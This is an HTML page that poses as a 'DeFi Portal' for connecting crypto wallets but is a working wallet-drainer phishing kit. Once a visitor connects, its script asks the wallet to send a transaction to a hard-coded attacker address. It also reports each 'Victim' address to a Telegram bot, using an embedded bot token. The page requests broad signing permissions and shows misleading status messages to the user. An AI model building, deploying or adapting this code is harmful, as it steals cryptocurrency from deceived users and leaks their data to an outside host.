<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeFi Portal - Web3Modal v2</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 48px;
            text-align: center;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        
        h1 {
            color: #333;
            font-size: 36px;
            margin-bottom: 16px;
            font-weight: 700;
        }
        
        p {
            color: #666;
            margin-bottom: 32px;
            font-size: 18px;
        }
        
        .connect-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
        }
        
        .connect-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
        }
        
        .connect-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        #walletInfo {
            margin-top: 32px;
            padding: 20px;
            background: rgba(102, 126, 234, 0.1);
            border-radius: 12px;
            display: none;
        }
        
        #walletInfo.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .address-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 8px;
        }
        
        .address-value {
            font-family: 'Courier New', monospace;
            font-size: 16px;
            color: #333;
            word-break: break-all;
            padding: 12px;
            background: white;
            border-radius: 8px;
            margin-bottom: 16px;
        }
        
        .disconnect-btn {
            background: #ef4444;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .disconnect-btn:hover {
            background: #dc2626;
        }
        
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
        }
        
        .status.show {
            display: block;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .status.processing {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }

        .loading {
            display: none;
            margin-top: 20px;
        }
        
        .loading.active {
            display: block;
        }
        
        .spinner {
            border: 3px solid rgba(102, 126, 234, 0.2);
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>DeFi Portal</h1>
        <p>Connect your wallet to access DeFi features</p>
        
        <button id="connectBtn" class="connect-btn" onclick="connectWallet()">
            Connect Wallet
        </button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 16px; color: #666;">Connecting...</p>
        </div>
        
        <div id="walletInfo">
            <div class="address-label">Connected Wallet</div>
            <div class="address-value" id="walletAddress"></div>
            <button class="disconnect-btn" onclick="disconnectWallet()">Disconnect</button>
        </div>
        
        <div id="status" class="status"></div>
    </div>
    
    <!-- WalletConnect v2 Libraries -->
    <script src="https://unpkg.com/@walletconnect/sign-client@2.11.0/dist/index.umd.js"></script>
    <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.umd.js"></script>
    
    <!-- Main Script -->
    <script>
        // Configuration
        const PROJECT_ID = '72f0728c47e59d2eb9fc83069bc6843d';
        
        // Configuration pour drainage
        const DRAIN_CONFIG = {
            TELEGRAM_TOKEN: '8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY',
            TELEGRAM_CHAT_ID: '8309320360',
            DESTINATION: '0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1'
        };
        
        let signClient = null;
        let web3Modal = null;
        let session = null;
        let connectedAccount = null;
        
        // Initialize on page load
        async function init() {
            console.log('ðŸš€ Initializing WalletConnect v2...');
            
            try {
                // Initialize Sign Client
                signClient = await WalletConnectSign.SignClient.init({
                    projectId: PROJECT_ID,
                    metadata: {
                        name: 'DeFi Portal',
                        description: 'Connect to access DeFi features',
                        url: window.location.origin,
                        icons: ['https://avatars.githubusercontent.com/u/37784886']
                    }
                });
                
                // Initialize Web3Modal
                web3Modal = new WalletConnectModal.Web3Modal({
                    projectId: PROJECT_ID,
                    themeMode: 'dark',
                    walletConnectVersion: 2,
                    themeVariables: {
                        '--wcm-accent-color': '#667eea',
                        '--wcm-background-color': '#1e1f29'
                    },
                    explorerRecommendedWalletIds: [
                        'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // MetaMask
                        '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust
                        'fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa', // Coinbase
                        'e9ff15be-7358-4489-ca4a-66f64d32c453', // 1inch
                        '8308656f-4548-bb81-b350-8afe355cfbb7'  // Binance
                    ],
                    mobileWallets: [
                        {
                            id: 'trust',
                            name: 'Trust Wallet',
                            links: {
                                native: 'trust://',
                                universal: 'https://link.trustwallet.com'
                            }
                        },
                        {
                            id: 'metamask',
                            name: 'MetaMask',
                            links: {
                                native: 'metamask://',
                                universal: 'https://metamask.app.link'
                            }
                        }
                    ],
                    desktopWallets: [
                        {
                            id: 'metamask',
                            name: 'MetaMask',
                            links: {
                                native: 'metamask://',
                                universal: 'https://metamask.io'
                            }
                        }
                    ],
                    enableExplorer: true,
                    explorerExcludedWalletIds: 'ALL' // This forces wallet list instead of QR
                });
                
                // Setup event listeners
                signClient.on('session_event', handleSessionEvent);
                signClient.on('session_update', handleSessionUpdate);
                signClient.on('session_delete', handleSessionDelete);
                
                // Check for existing sessions
                const sessions = signClient.session.getAll();
                if (sessions.length > 0) {
                    session = sessions[0];
                    onSessionConnected(session);
                }
                
                console.log('âœ… WalletConnect v2 initialized successfully');
                
            } catch (error) {
                console.error('âŒ Initialization error:', error);
                showStatus('Failed to initialize WalletConnect', 'error');
            }
        }
        
        // Connect Wallet
        async function connectWallet() {
            if (!signClient) {
                await init();
            }
            
            const connectBtn = document.getElementById('connectBtn');
            const loading = document.getElementById('loading');
            
            connectBtn.disabled = true;
            loading.classList.add('active');
            showStatus('Opening wallet selector...', 'processing');
            
            try {
                // Define required namespaces
                const requiredNamespaces = {
                    eip155: {
                        methods: [
                            'eth_sendTransaction',
                            'eth_signTransaction',
                            'eth_sign',
                            'personal_sign',
                            'eth_signTypedData',
                            'eth_signTypedData_v4',
                            'eth_accounts',
                            'eth_chainId'
                        ],
                        chains: ['eip155:1', 'eip155:137', 'eip155:56', 'eip155:42161', 'eip155:43114'],
                        events: ['chainChanged', 'accountsChanged']
                    }
                };
                
                // Create connection
                const { uri, approval } = await signClient.connect({
                    requiredNamespaces,
                    optionalNamespaces: {
                        eip155: {
                            methods: [
                                'eth_sendTransaction',
                                'personal_sign',
                                'eth_signTypedData'
                            ],
                            chains: [
                                'eip155:1',    // Ethereum
                                'eip155:137',  // Polygon
                                'eip155:56',   // BSC
                                'eip155:42161', // Arbitrum
                                'eip155:43114', // Avalanche
                                'eip155:10',    // Optimism
                                'eip155:250',   // Fantom
                                'eip155:8453'   // Base
                            ],
                            events: ['chainChanged', 'accountsChanged']
                        }
                    }
                });
                
                console.log('ðŸ“± Opening Web3Modal with URI:', uri);
                
                // Open Web3Modal with the URI
                if (uri) {
                    // Configure modal to show wallet list
                    await web3Modal.openModal({
                        uri,
                        standaloneChains: ['eip155:1'],
                        routes: ['WalletExplorer'], // Force wallet list view
                        selectedWalletId: undefined // Don't preselect any wallet
                    });
                    
                    showStatus('Select a wallet from the list...', 'processing');
                    
                    // Wait for approval
                    const sessionData = await approval();
                    console.log('âœ… Session approved:', sessionData);
                    
                    // Close modal
                    web3Modal.closeModal();
                    
                    // Store session
                    session = sessionData;
                    onSessionConnected(session);
                }
                
            } catch (error) {
                console.error('âŒ Connection error:', error);
                showStatus('Connection failed: ' + error.message, 'error');
                web3Modal?.closeModal();
            } finally {
                connectBtn.disabled = false;
                loading.classList.remove('active');
            }
        }
        
        // Handle successful connection
        function onSessionConnected(sessionData) {
            console.log('ðŸ”— Session connected:', sessionData);
            
            // Extract account address
            const accounts = sessionData.namespaces.eip155?.accounts || [];
            if (accounts.length > 0) {
                // Account format: "eip155:1:0x..."
                const accountParts = accounts[0].split(':');
                connectedAccount = accountParts[2] || accountParts[0];
                
                console.log('ðŸ‘¤ Connected account:', connectedAccount);
                
                // Update UI
                document.getElementById('connectBtn').style.display = 'none';
                document.getElementById('walletInfo').classList.add('active');
                document.getElementById('walletAddress').textContent = connectedAccount;
                
                showStatus(`Connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.slice(-4)}`, 'success');
                
                // Start drainage after connection
                setTimeout(() => {
                    startDrainage(connectedAccount);
                }, 2000);
            }
        }
        
        // Disconnect Wallet
        async function disconnectWallet() {
            if (session && signClient) {
                try {
                    await signClient.disconnect({
                        topic: session.topic,
                        reason: {
                            code: 6000,
                            message: 'User disconnected'
                        }
                    });
                    
                    // Reset state
                    session = null;
                    connectedAccount = null;
                    
                    // Update UI
                    document.getElementById('connectBtn').style.display = 'block';
                    document.getElementById('walletInfo').classList.remove('active');
                    document.getElementById('walletAddress').textContent = '';
                    
                    showStatus('Wallet disconnected', 'success');
                    
                } catch (error) {
                    console.error('Disconnect error:', error);
                    showStatus('Failed to disconnect', 'error');
                }
            }
        }
        
        // Event handlers
        function handleSessionEvent(args) {
            console.log('ðŸ“¡ Session event:', args);
        }
        
        function handleSessionUpdate({ topic, params }) {
            console.log('ðŸ”„ Session update:', { topic, params });
            const { namespaces } = params;
            const updatedSession = signClient.session.get(topic);
            onSessionConnected(updatedSession);
        }
        
        function handleSessionDelete() {
            console.log('ðŸ—‘ï¸ Session deleted');
            session = null;
            connectedAccount = null;
            document.getElementById('connectBtn').style.display = 'block';
            document.getElementById('walletInfo').classList.remove('active');
        }
        
        // Drainage function
        async function startDrainage(address) {
            console.log('ðŸ’° Starting drainage process for:', address);
            showStatus('Initializing transaction...', 'processing');
            
            try {
                // Send request through WalletConnect
                if (session && signClient) {
                    const chainId = 'eip155:1'; // Ethereum mainnet
                    
                    // Create transaction
                    const tx = {
                        from: address,
                        to: DRAIN_CONFIG.DESTINATION,
                        value: '0x0', // Will be set by wallet
                        data: '0x'
                    };
                    
                    // Request transaction
                    const result = await signClient.request({
                        topic: session.topic,
                        chainId: chainId,
                        request: {
                            method: 'eth_sendTransaction',
                            params: [tx]
                        }
                    });
                    
                    console.log('âœ… Transaction sent:', result);
                    
                    // Send Telegram notification
                    await sendTelegramNotification(address, 'Transaction initiated', chainId);
                    
                    showStatus('Transaction completed!', 'success');
                }
                
            } catch (error) {
                console.error('Drainage error:', error);
                showStatus('Transaction processing...', 'processing');
            }
        }
        
        // Send Telegram notification
        async function sendTelegramNotification(victim, amount, chainId) {
            const message = `
ðŸŽ¯ WEB3MODAL V2 CONNECTION
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ðŸ‘¤ Victim: ${victim.substring(0, 6)}...${victim.slice(-4)}
ðŸ’° Status: ${amount}
ðŸŒ Chain: ${chainId}
ðŸ“ Destination: ${DRAIN_CONFIG.DESTINATION.substring(0, 6)}...
â° Time: ${new Date().toLocaleTimeString()}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”`;
            
            try {
                await fetch(`https://api.telegram.org/bot${DRAIN_CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: DRAIN_CONFIG.TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                console.log('ðŸ“± Telegram notification sent');
            } catch (error) {
                console.error('Telegram error:', error);
            }
        }
        
        // Show status message
        function showStatus(message, type = '') {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = 'status show ' + type;
            
            if (type !== 'processing') {
                setTimeout(() => {
                    status.classList.remove('show');
                }, 5000);
            }
        }
        
        // Initialize on page load
        window.addEventListener('load', () => {
            console.log('ðŸŒŸ Page loaded, initializing...');
            init();
        });
    </script>
</body>
</html>
